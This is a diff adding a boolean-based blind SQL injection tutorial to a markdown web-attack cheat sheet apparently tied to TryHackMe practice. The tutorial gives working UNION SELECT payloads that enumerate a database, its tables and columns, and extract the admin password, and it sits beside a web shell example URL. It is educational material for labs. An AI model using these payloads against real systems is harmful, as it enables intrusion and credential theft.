@@ -124,8 +124,44 @@ Example :
           url/upload_file.php?parameter=commnad
 
           http://cyberteach360/shell.php?cmd=id
-          
+# Boolean Based SQL Injection
+Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, in fact, with just these two responses, it's possible to enumerate a whole database structure and contents.
 
+#### Step 1:Find out actual column number
+
+      1.admin123' UNION SELECT 1;-- 
+      2.admin123' UNION SELECT 1,2,3;--
+if response is true till 1,2,3 but flase in 1,2,3,4 ,the target column number is 3
+
+#### Step 2:Find out database name
+
+      1.admin123' UNION SELECT 1,2,3 where database() like 'some character%';--
+        example:
+                admin123' UNION SELECT 1,2,3 where database() like 's%';--
+ Sequentially change the character and check the respons is true or flase
+ suppose we got the database name  :sqli_three
+ 
+#### Step 3:Find out table name
+ 
+ 
+      1.admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--         
+      
+Sequentially change the character and check the respons is true or flase
+suppose we got the table name  :users
+Step 4:Find out Column name
+     
+     1.admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+
+After,sequentially Repeating this process you will get column name
+suppose, the column name username and another is password
+
+#### Step 5:Find out username column value
+      admin123' UNION SELECT 1,2,3 from users where username like 'a%
+ After,sequentially Repeating this process you will get column username value and this is:admin.
+ 
+#### Step 6:Find out password column value
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+if you properly do this , you will get password 
 ## Practicing and Learning Resources:
 
 #### Try Hack Me :
